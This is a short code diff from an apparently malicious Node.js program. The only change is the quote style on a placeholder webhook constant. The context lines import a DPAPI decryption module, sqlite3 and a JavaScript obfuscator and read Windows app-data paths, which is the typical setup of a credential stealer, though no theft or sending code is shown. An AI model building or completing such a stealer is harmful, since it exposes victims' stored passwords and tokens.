@@ -10,7 +10,7 @@ const sqlite3 = require('sqlite3');
 const dpapi = require('win-dpapi');
 const JavaScriptObfuscator = require('javascript-obfuscator');
 
-const wbk = '%WEBHOOK_LINK%';
+const wbk = "%WEBHOOK_LINK%";
 
 var appdata = process.env.APPDATA,
     LOCAL = process.env.LOCALAPPDATA,
